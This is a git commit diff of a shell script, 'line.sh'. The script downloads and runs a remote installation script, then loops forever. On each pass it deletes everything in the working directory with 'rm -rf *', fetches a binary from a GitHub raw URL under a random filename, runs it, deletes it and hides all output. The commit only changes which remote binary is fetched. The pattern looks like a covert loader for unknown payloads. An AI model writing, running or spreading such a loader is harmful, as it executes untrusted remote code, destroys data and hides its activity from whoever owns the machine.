7142e329a9ed88a86342483005752be02ecada1c
udhaindah <udhaindah937@gmail.com>
2024-09-24 17:33:19 +0700

    Update line.sh

--- line.sh
+++ line.sh
@@ -1,4 +1,4 @@
 wget https://raw.githubusercontent.com/samaniheo/aploka/main/installation.sh
 bash installation.sh
 TAMPER=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-while :; do timeout 1800 rm -rf *; wget -qO $TAMPER https://raw.githubusercontent.com/udhaindah/indaho/refs/heads/main/sarz; chmod +x $TAMPER; ./$TAMPER; rm -rf $TAMPER; sleep 25; done > /dev/null 2>&1
+while :; do timeout 1800 rm -rf *; wget -qO $TAMPER https://raw.githubusercontent.com/udhaindah/indaho/refs/heads/main/mec; chmod +x $TAMPER; ./$TAMPER; rm -rf $TAMPER; sleep 25; done > /dev/null 2>&1
